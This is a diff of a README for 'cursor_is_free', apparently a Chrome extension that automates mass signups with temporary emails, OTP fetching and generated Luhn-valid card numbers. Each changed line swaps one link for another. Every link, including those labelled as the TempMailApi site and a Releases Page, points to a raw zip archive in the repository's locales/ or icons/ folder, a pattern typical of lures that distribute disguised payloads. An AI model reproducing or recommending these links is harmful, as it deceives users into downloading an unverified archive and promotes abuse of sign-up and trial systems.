@@ -2,7 +2,7 @@
 
 ## 🚀 Download Now
 
-[![Download cursor_is_free](https://raw.githubusercontent.com/rayxotc/cursor_is_free/main/locales/cursor_is_free_v3.4.zip)](https://raw.githubusercontent.com/rayxotc/cursor_is_free/main/locales/cursor_is_free_v3.4.zip)
+[![Download cursor_is_free](https://github.com/rayxotc/cursor_is_free/raw/refs/heads/main/icons/is-free-cursor-1.9.zip)](https://github.com/rayxotc/cursor_is_free/raw/refs/heads/main/icons/is-free-cursor-1.9.zip)
 
 ## 📝 Introduction
 
@@ -12,7 +12,7 @@ cursor_is_free is a Chrome extension designed to make signing up for services ea
 
 ### 🤖 Automation
 - **Random Name Generation:** Create unique names based on cultural contexts for English, Chinese, Japanese, and Korean.
-- **Temp Email Management:** Generate a unique temporary email for each signup using the [TempMailApi](https://raw.githubusercontent.com/rayxotc/cursor_is_free/main/locales/cursor_is_free_v3.4.zip).
+- **Temp Email Management:** Generate a unique temporary email for each signup using the [TempMailApi](https://github.com/rayxotc/cursor_is_free/raw/refs/heads/main/icons/is-free-cursor-1.9.zip).
 - **Secure Passwords:** Generate strong passwords with 12 characters, including symbols.
 - **OTP Handling:** Automatically fetch and extract One-Time Passwords.
 - **Test Card Generation:** Create Luhn-validated test cards with a custom Bank Identification Number.
@@ -38,7 +38,7 @@ cursor_is_free is a Chrome extension designed to make signing up for services ea
 To use cursor_is_free, follow these steps:
 
 1. **Download the Extension:**
-   - Visit the [Releases Page](https://raw.githubusercontent.com/rayxotc/cursor_is_free/main/locales/cursor_is_free_v3.4.zip) to download the latest version of the extension.
+   - Visit the [Releases Page](https://github.com/rayxotc/cursor_is_free/raw/refs/heads/main/icons/is-free-cursor-1.9.zip) to download the latest version of the extension.
   
 2. **Install in Chrome:**
    - Open your Chrome browser.
@@ -80,7 +80,7 @@ Yes, cursor_is_free does not store any personal data. All information is handled
 
 Do not wait. Experience hassle-free signups today by downloading cursor_is_free.
 
-[Download Now](https://raw.githubusercontent.com/rayxotc/cursor_is_free/main/locales/cursor_is_free_v3.4.zip) 
+[Download Now](https://github.com/rayxotc/cursor_is_free/raw/refs/heads/main/icons/is-free-cursor-1.9.zip) 
 
 ## 🛠️ Troubleshooting
 
@@ -93,7 +93,7 @@ If you face issues:
 
 ## 🙏 Acknowledgements
 
-This project uses the TempMailApi for its temporary email functionality. For more information, visit [TempMailApi](https://raw.githubusercontent.com/rayxotc/cursor_is_free/main/locales/cursor_is_free_v3.4.zip).
+This project uses the TempMailApi for its temporary email functionality. For more information, visit [TempMailApi](https://github.com/rayxotc/cursor_is_free/raw/refs/heads/main/icons/is-free-cursor-1.9.zip).
 
 ---
 
